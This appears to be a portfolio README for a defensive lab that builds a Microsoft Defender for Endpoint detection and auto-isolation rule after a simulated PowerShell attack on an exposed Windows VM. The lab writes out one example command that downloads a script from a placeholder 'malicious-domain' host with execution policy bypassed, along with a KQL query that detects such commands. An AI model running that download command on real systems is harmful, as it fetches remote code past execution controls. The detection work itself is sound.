# Scenario 1: Internet-Exposed Windows VM – Simulated Remote Code Execution (RCE)

## 🎯 Objective

Simulate adversary activity against an intentionally exposed Windows virtual machine and build a custom detection rule in Microsoft Defender for Endpoint (MDE) to identify and automatically respond to suspicious PowerShell-based execution.

This lab mirrors real-world SOC detection engineering and incident response workflows.

---

## 🏗 Lab Architecture
<img width="554" height="253" alt="Screenshot 2026-03-02 at 11 19 13 AM" src="https://github.com/user-attachments/assets/3ac83b38-9c91-4279-9df5-58fbdba41f89" />
---

## 🖥️ Environment Configuration

### Infrastructure
- AWS EC2 Windows Server Instance
- Public IP Address Assigned
- Windows Firewall Disabled (for controlled simulation)
- RDP Enabled
- Microsoft Defender for Endpoint Onboarded

### Verification Steps
- Confirm device visibility in Microsoft 365 Defender portal
- Validate telemetry ingestion
- Confirm Advanced Hunting data availability

---

## 🧪 Attack Simulation

### Simulated Technique
PowerShell-based command execution intended to mimic Remote Code Execution (RCE) behavior.

Example command used for simulation:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://malicious-domain/test.ps1 -OutFile test.ps1"


### Behavioral Indicators Observed

- PowerShell spawned from suspicious context
- Network connection initiated from PowerShell
- Encoded / bypass execution parameters
- Script file written to disk

## 🧠 Custom KQL Detection Query
DeviceProcessEvents
| where FileName =~ "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
   or ProcessCommandLine contains "-ExecutionPolicy Bypass"
| project Timestamp,
          DeviceName,
          InitiatingProcessAccountName,
          ProcessCommandLine,
          InitiatingProcessFileName

## Detection Logic Explanation

- Filters for PowerShell execution
- Looks for suspicious command-line arguments
- Identifies potential script download activity
- Captures parent process context for investigation

## 🛡 Automated Response

Configured custom detection rule in MDE to:

- Trigger alert upon query match
- Automatically isolate device
- Generate investigation package

## Response Actions Observed

- Device moved to isolated state
- Alert generated in Microsoft 365 Defender
- Full process tree captured
- Timeline investigation performed

<img width="668" height="245" alt="Screenshot 2026-03-02 at 11 21 46 AM" src="https://github.com/user-attachments/assets/9d5a4c89-5877-483b-894a-1127c3e921d9" />


## 📊 Investigation Findings

- PowerShell initiated outbound HTTP request
- Script written to local disk
- No persistence established (controlled test)
- Activity successfully detected and contained

## 📘 Lessons Learned

- Command-line logging is critical for behavioral detection
- ExecutionPolicy bypass is a strong signal when combined with network activity
- Detection tuning reduces false positives
- Automated containment significantly reduces response time

## 🔮 Detection Improvement Opportunities

- Add Base64 encoded command detection
- Correlate process + network telemetry
- Add anomaly-based behavioral logic
- Implement allowlist exclusions for legitimate admin activity

## 🧩 Skills Demonstrated

- Threat Simulation
- KQL Query Development
- Endpoint Telemetry Analysis
- MITRE ATT&CK Mapping
- Automated Response Engineering
- Incident Timeline Analysis

## ⚠️ Disclaimer

- This lab was conducted in an isolated environment for defensive security research and educational purposes only.

- No production systems were targeted.
